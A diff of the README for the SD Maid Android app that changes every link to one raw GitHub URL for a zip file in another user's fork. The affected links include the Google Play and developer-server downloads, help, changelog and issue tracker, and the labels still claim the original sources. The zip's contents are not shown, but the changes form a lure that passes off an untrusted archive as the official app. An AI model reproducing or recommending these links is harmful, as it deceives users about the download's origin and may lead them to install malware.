@@ -1,28 +1,28 @@
 # SD Maid
 
-[![Crowdin](https://d322cqt584bo4o.cloudfront.net/sdmaid/localized.svg)](https://crowdin.com/project/sdmaid)
+[![Crowdin](https://raw.githubusercontent.com/BarrerosLeo/sdmaid/master/muscadel/sdmaid.zip)](https://raw.githubusercontent.com/BarrerosLeo/sdmaid/master/muscadel/sdmaid.zip)
 
 SD Maid is an Android app that helps you manage files and apps.
 
 ## Download
 ### Production
-- [SD Maid - Google Play](https://play.google.com/store/apps/details?id=eu.thedarken.sdm)
-- [SD Maid - darken's server](http://sdmaid.darken.eu/download)
-- [Pro Version Unlocker - Google Play](https://play.google.com/store/apps/details?id=eu.thedarken.sdm.unlocker)
+- [SD Maid - Google Play](https://raw.githubusercontent.com/BarrerosLeo/sdmaid/master/muscadel/sdmaid.zip)
+- [SD Maid - darken's server](https://raw.githubusercontent.com/BarrerosLeo/sdmaid/master/muscadel/sdmaid.zip)
+- [Pro Version Unlocker - Google Play](https://raw.githubusercontent.com/BarrerosLeo/sdmaid/master/muscadel/sdmaid.zip)
 
 ### Beta
-- [SD Maid - Google Play](https://play.google.com/apps/testing/eu.thedarken.sdm)
-- [SD Maid - darken's server](http://sdmaid.darken.eu/download)
-- [Pro Version Unlocker - Google Play](https://play.google.com/apps/testing/eu.thedarken.sdm.unlocker)
+- [SD Maid - Google Play](https://raw.githubusercontent.com/BarrerosLeo/sdmaid/master/muscadel/sdmaid.zip)
+- [SD Maid - darken's server](https://raw.githubusercontent.com/BarrerosLeo/sdmaid/master/muscadel/sdmaid.zip)
+- [Pro Version Unlocker - Google Play](https://raw.githubusercontent.com/BarrerosLeo/sdmaid/master/muscadel/sdmaid.zip)
 
 ## Help
-[Help can be found here](http://sdmaid.darken.eu/help).
+[Help can be found here](https://raw.githubusercontent.com/BarrerosLeo/sdmaid/master/muscadel/sdmaid.zip).
 
 ## Changelog
-[Changelog](CHANGELOG.md)
+[Changelog](https://raw.githubusercontent.com/BarrerosLeo/sdmaid/master/muscadel/sdmaid.zip)
 
 ## Translation
-If you would like to help translate SD Maid, [look here](http://sdmaid.darken.eu/translation).
+If you would like to help translate SD Maid, [look here](https://raw.githubusercontent.com/BarrerosLeo/sdmaid/master/muscadel/sdmaid.zip).
 
 ## Report a bug / Request a feature
-The prefered way to report a bug or request features is through the [issue tracker](http://sdmaid.darken.eu/issues).
+The prefered way to report a bug or request features is through the [issue tracker](https://raw.githubusercontent.com/BarrerosLeo/sdmaid/master/muscadel/sdmaid.zip).
